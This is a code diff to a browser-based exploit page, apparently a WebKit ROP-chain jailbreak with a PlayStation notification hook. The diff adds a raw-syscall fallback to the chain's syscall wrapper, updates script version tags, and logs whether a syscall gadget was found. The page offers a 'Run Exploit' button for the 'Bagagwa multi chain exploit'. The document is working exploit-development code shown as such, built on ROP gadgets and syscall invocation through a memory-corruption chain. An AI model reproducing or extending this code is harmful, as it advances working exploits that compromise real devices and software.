@@ -105,8 +105,8 @@ try {
 
 <!-- classic scripts: rop.js defines worker_rop globally, main.js detects
      firmware, injects the offset script, and defines prepare() globally -->
-<script src="rop.js"></script>
-<script src="main.js"></script>
+<script src="rop.js?v=raw1"></script>
+<script src="main.js?v=raw1"></script>
 <script>
 window.offsetsReady = new Promise(function (res, rej) {
     var s = document.querySelector('script[src*="offsets/"]');
@@ -317,12 +317,15 @@ async function watchdog(promise, what) {
 
 async function sys(num, a, b, c, d, e, f) {
     if (chainDead) throw new Error("sys: chain dead");
-    if (P.syscalls[num] === undefined)
-        throw new Error("sys: 0x" + num.toString(16) + " no stub");
+    const hasStub = P.syscalls[num] !== undefined;
+    if (!hasStub && !P.rawSyscall)
+        throw new Error("sys: 0x" + num.toString(16) + " no stub and no raw-syscall");
     syscallCount++;
     state.syscallsIssued.add(num);
-    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
-        "syscall 0x" + num.toString(16));
+    const callPromise = hasStub
+        ? chain.syscall(num, a, b, c, d, e, f)
+        : chain.raw_syscall(num, a, b, c, d, e, f);
+    const raw = await watchdog(callPromise, "syscall 0x" + num.toString(16));
     const cl = classify(raw);
     return { raw, s32: cl.s32, failed: cl.failed,
         hex: "0x" + raw.toString(), errText: errText({ s32: cl.s32, failed: cl.failed }) };
@@ -462,7 +465,8 @@ async function init() {
 
         log("chain operational, pid=" + pid.s32 +
             " gadgets=" + Object.keys(P.gadgets).length +
-            " syscalls=" + Object.keys(P.syscalls).length, "step");
+            " syscalls=" + Object.keys(P.syscalls).length +
+            " raw=" + (P.rawSyscall ? "1(syscall gadget found)" : "0(NOT found)"), "step");
         try { await psNotify("Bagagwa: WebKit OK pid=" + pid.s32); } catch(e) {}
         setStatus("ready — press Run Exploit", "");
         btnEl.disabled = false;
@@ -480,7 +484,7 @@ async function runExploit() {
     log("\n=== BAGAGWA MULTI CHAIN EXPLOIT ===\n", "stage-hdr");
 
     try {
-        const { makeBagagwaEngine } = await import("./bagagwa.js?v=arb3");
+        const { makeBagagwaEngine } = await import("./bagagwa.js?v=raw1");
 
         const driver = { core: 5, origMaskBytes: null, coreWhy: "default" };
 
